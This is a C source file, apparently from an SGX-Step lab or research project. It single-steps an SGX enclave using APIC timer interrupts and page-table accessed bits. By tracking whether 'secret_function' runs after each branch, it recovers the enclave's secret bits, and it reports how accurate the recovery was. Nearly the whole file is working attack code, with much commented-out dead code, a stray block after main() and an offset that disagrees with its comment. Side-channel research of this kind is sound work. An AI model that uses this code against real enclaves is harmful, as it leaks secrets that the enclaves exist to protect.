#include <sgx_urts.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>

#include "Enclave/encl_u.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/cache.h"


#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/mman.h>

#define IOCTL_CHECK  _IOWR('a', 'a', struct query)
#define IOCTL_CLEAR  _IOW('a', 'b', struct query)

uint64_t *pte_all = NULL;
uint64_t *pte_target = NULL;

struct query {
    int pid;
    unsigned long addr;
    int accessed;
};

/* ============================================================
 * BRANCH INFO — from objdump
 *   je at 0x401c inside ecall_process_bits (page 0x4000)
 *   secret_function at 0x3000 (separate page)
 * ============================================================ */
#define BRANCH_OFFSET  0x5021
#define SECRET_OFFSET  0x3000
#define ALL_OFFSET  0x4000
/* secret the enclave processes */
#define SECRET_LEN 8
static uint8_t secret_bits[SECRET_LEN] = {0, 1, 0, 0, 0, 1, 0, 1};

/* ===================== globals ===================== */
sgx_enclave_id_t eid            = 0;
int irq_cnt                     = 0;
int do_irq                      = 1;
uint64_t *pte_encl              = NULL;
uint64_t *pmd_encl              = NULL;
uint64_t *pte_secret_encl       = NULL;  /* PTE for secret_function's page */
uint64_t *pte_all_encl          = NULL;  /* PTE for all_function's page */

uint64_t branch_addr            = 0;
int recovered[SECRET_LEN]       = {0};
int rec_idx                     = 0;
int waiting_for_result          = 0;

/* ===================== AEP handler ===================== */

// int step_count = 0;
int curr_rip = 0;
int fd;
struct query q;
typedef enum { IDLE, IN_ALL, ARMED, COOLDOWN } state_t;

state_t state  = IDLE;
int     window = 0;
int     seen   = 0;
int     cool   = 0;
int     dwell  = 0;

void aep_reset(void)
{
    state  = IDLE;
    window = 0;
    seen   = 0;
    cool   = 0;
    dwell  = 0;

    irq_cnt = 0;
    rec_idx = 0;
    do_irq  = 1;
    memset(recovered, 0, sizeof(recovered));

    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_target = MARK_NOT_ACCESSED(*pte_target);
    flush(pte_all);
    flush(pte_target);
}

void aep_cb_func(void)
{
    irq_cnt++;

    switch (state) {

    case IDLE:
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
            /* all_function body is now executing — wait for it to finish */
            state = IN_ALL;
        }
        break;

    case IN_ALL:
        if (ACCESSED(*pte_all)) {
            /* still inside all_function body — keep clearing, stay here */
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        } else {
            /* all_function page NOT accessed this IRQ — it has returned.
             * Now we're in the instructions after the call, heading toward
             * cmpb / je / call secret_function.
             * Arm the observation window. */
            *pte_target = MARK_NOT_ACCESSED(*pte_target);
            flush(pte_target);

            seen   = 0;
            window = 5;   // only cmpb + je between here and secret_function
            state  = ARMED;
        }
        break;

    case ARMED:
        if (ACCESSED(*pte_target)) {
            seen = 1;
            *pte_target = MARK_NOT_ACCESSED(*pte_target);
            flush(pte_target);
            window = 1;   // early exit
        }

        if (ACCESSED(*pte_all)) {
            /* next iteration's all_function already started — suppress */
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        }

        if (--window == 0) {
            if (rec_idx < SECRET_LEN)
                recovered[rec_idx++] = seen ? 1 : 0;

            if (rec_idx >= SECRET_LEN) {
                do_irq = 0;
                goto done;
            }

            cool  = 3;
            state = COOLDOWN;
        }
        break;

    case COOLDOWN:
        if (ACCESSED(*pte_all)) {
            *pte_all = MARK_NOT_ACCESSED(*pte_all);
            flush(pte_all);
        }
        if (ACCESSED(*pte_target)) {
            *pte_target = MARK_NOT_ACCESSED(*pte_target);
            flush(pte_target);
        }
        if (--cool == 0)
            state = IDLE;
        break;
    }

done:
    if (do_irq && irq_cnt < 500000){
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
    else {
        do_irq = 0;
    }
}
    // q.addr = (unsigned long) *pte_all_encl;

    // if(ACCESSED(*pte_all_encl)==1 && curr_rip==0){
    //     void *temp = MARK_NOT_ACCESSED(*pte_all_encl);
    //     recovered[rec_idx++] = 1;
    //     curr_rip=1;
    // }

    // ioctl(fd, IOCTL_CHECK, &q);
    // if(q.accessed!=0){
    //     ioctl(fd, IOCTL_CLEAR, &q);
    //     recovered[rec_idx++] = 1;
    //     curr_rip=1;
    // }
    // else if(ACCESSED(*pte_all_encl)==1 && curr_rip==1){
    //     // recovered[rec_idx++] = 1;
    //     ;
    // }

    // if (curr_rip==0){
    //     if(ACCESSED(*pte_all_encl)==1){
    //         curr_rip==1;
    //         void *temp = MARK_NOT_ACCESSED(*pte_all_encl);
    //     }
    //     MARK_NOT_ACCESSED(*pte_all_encl);

    // }
    // MARK_NOT_ACCESSED(*pte_all_encl);



    // // 5019:	e8 e2 ef ff ff       	call   4000 <all_function>
    // // 501e:	80 3f 00             	cmpb   $0x0,(%rdi)
    // // 5021:	74 05                	je     5028 <ecall_process_bits+0x28>
    // // 5023:	e8 d8 df ff ff       	call   3000 <secret_function>
    // //step 1 : check if all_function was executed in the prev instruction
    // if(curr_rip==0 && ACCESSED(*pte_all_encl)){
    //     // this means we're at rip = 501e cmpb
    //     curr_rip = 1;
    //     *pte_all_encl = MARK_NOT_ACCESSED(*pte_all_encl);
    // }else if(curr_rip<20 && curr_rip>0){//can't check for zero stepping, so should check for about 10-12 interrupts?
    //     if(ACCESSED(*pte_secret_encl)){
    //         *pte_secret_encl = MARK_NOT_ACCESSED(*pte_secret_encl);
    //         recovered[rec_idx++] = 1;
    //         curr_rip = 0;
    //     }else {
    //         curr_rip++;
    //     }
    // }else if(curr_rip == 20){
    //     recovered[rec_idx++] = 0;
    //     curr_rip = 0;
    // }

    // q.addr = (unsigned long) *pte_all_encl;
    // q.accessed = 0;
    // ioctl(fd, IOCTL_CHECK, &q);
    // if(curr_rip==0 && q.accessed==1){
    //     // this means we're at rip = 501e cmpb
    //     curr_rip = 1;
    //     ioctl(fd, IOCTL_CLEAR, &q);
    // }else if(curr_rip<20 && curr_rip>0){//can't check for zero stepping, so should check for about 20 interrupts
    //     q.addr = (unsigned long) *pte_secret_encl;
    //     if(q.accessed){
    //         *pte_secret_encl = MARK_NOT_ACCESSED(*pte_secret_encl);
    //         recovered[rec_idx++] = 1;
    //         curr_rip = 0;
    //     }else {
    //         curr_rip++;
    //     }
    // }else if(curr_rip == 20){
    //     recovered[rec_idx++] = 0;
    //     curr_rip = 0;
    // }
// rearm:

    // mark_enclave_exec_not_accessed();

    // if (do_irq) {
    //     *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
    //     flush(pmd_encl);
    //     apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    // }

/* ===================== fault handler ===================== */

void fault_handler(int signal) {
    info("fault %d, restoring page perms", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
}

/* ===================== setup ===================== */

void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}


void attacker_config_page_table(void) {
    /* point execute-disable at ecall_process_bits to trigger first fault */

    uint64_t base = (uint64_t)get_enclave_base();

    /* compute addresses */
    void *all_addr    = (void *)(base + ALL_OFFSET);
    void *target_addr = (void *)(base + SECRET_OFFSET);

    /* map page table entries */
    ASSERT(pte_all    = remap_page_table_level(all_addr, PTE));
    ASSERT(pte_target = remap_page_table_level(target_addr, PTE));

    ASSERT(PRESENT(*pte_all));
    ASSERT(PRESENT(*pte_target));

    /* clear accessed bits initially */
    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_target = MARK_NOT_ACCESSED(*pte_target);

    flush(pte_all);
    flush(pte_target);

    /* debug prints */
    info("all_function addr    = %p", all_addr);
    info("secret_function addr = %p", target_addr);

    info("pte_all    = %p", pte_all);
    info("pte_target = %p", pte_target);

    info("all page    = %#lx", (uint64_t)all_addr & ~0xfff);
    info("target page = %#lx", (uint64_t)target_addr & ~0xfff);
    /*
    void *code_adrs = get_enclave_base();
    code_adrs += get_symbol_offset("ecall_process_bits");
    info("ecall_process_bits at %p", code_adrs);

    branch_addr = (uint64_t)get_enclave_base() + BRANCH_OFFSET;
    info("watching branch at %#lx (offset %#x)", branch_addr, BRANCH_OFFSET);

    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
    ASSERT(PRESENT(*pte_encl));
    mark_enclave_exec_not_accessed();

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    ASSERT(PRESENT(*pmd_encl));
    */

    /* separately track secret_function's page PTE */
    /*
    void *secret_adrs = get_enclave_base();
    secret_adrs += get_symbol_offset("secret_function");
    info("secret_function at %p", secret_adrs);
    ASSERT(pte_secret_encl = remap_page_table_level(secret_adrs, PTE));
    ASSERT(PRESENT(*pte_secret_encl)); */

    /* separately track all_function's page PTE */\
    /*
    void *all_adrs = get_enclave_base();
    all_adrs += get_symbol_offset("all_function");
    info("all_function at %p", all_adrs);
    ASSERT(pte_all_encl = remap_page_table_level(all_adrs, PTE));
    ASSERT(PRESENT(*pte_all_encl));
    */
}

/* ===================== main ===================== */

int main(int argc, char **argv) {
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt   = {0};

    /* 1. Create enclave */
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", 0,
                                  &token, &updated, &eid, NULL));

    /* 2. Dry run to page in enclave memory */
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* 3. Symbol + runtime setup */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();           // pins CPU, sets up SIGSEGV handler
    attacker_config_page_table();        // maps PTEs, clears accessed bits

    /* 4. AEP callback registration */
    register_aep_cb(aep_cb_func);

    /* 5. IDT/APIC setup */
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    /* 6. Verify timer works (optional but useful) */
    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    while (!__ss_irq_fired);             // spin until one IRQ confirmed
    info("APIC timer confirmed working");

    /* 7. Re-clear accessed bits (dry run + timer test may have dirtied them) */
    *pte_all    = MARK_NOT_ACCESSED(*pte_all);
    *pte_target = MARK_NOT_ACCESSED(*pte_target);
    flush(pte_all);
    flush(pte_target);

    /* 8. Arm timer and immediately enter enclave */
    info_event("Single-stepping enclave...");
    __ss_irq_fired = 0;
    aep_reset();
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);   // ← last thing before EENTER
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    
    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
    printf("\n");

    int correct = 0;
    for (int i = 0; i < rec_idx; i++)
        if (recovered[i] == secret_bits[i]) correct++;
    printf("accuracy:  %d/%d (%.0f%%)\n",
           correct, SECRET_LEN,
           (float)correct / SECRET_LEN * 100);

    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);
    return 0;
}

    /* results ... */

    /*
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt   = {0};


    // fd = open("/dev/abit_probe", O_RDWR);
    // if (fd < 0) {
    //     perror("open");
    //     return -1;
    // }
    // q.pid = getpid();
    info_event("Creating enclave...");
    // SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/
                                //   &token, &updated, &eid, NULL));

    /* dry run to page in all enclave memory */
    // info("Dry run...");
    // SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* setup 
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    // register_aep_cb(aep_cb_func);

    info_event("Setting up APIC/IDT");
        map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    register_aep_cb(aep_cb_func);

    info_event("Single-stepping enclave...");

    /* Arm the timer at the LAST possible moment before enclave entry 
    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);   // ← moved to here

    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));
    */

    /* results */
    /*
    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
    printf("\n");

    int correct = 0;
    for (int i = 0; i < rec_idx; i++)
        if (recovered[i] == secret_bits[i]) correct++;
    printf("accuracy:  %d/%d (%.0f%%)\n",
           correct, SECRET_LEN,
           (float)correct / SECRET_LEN * 100);

    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);
    return 0;
    */

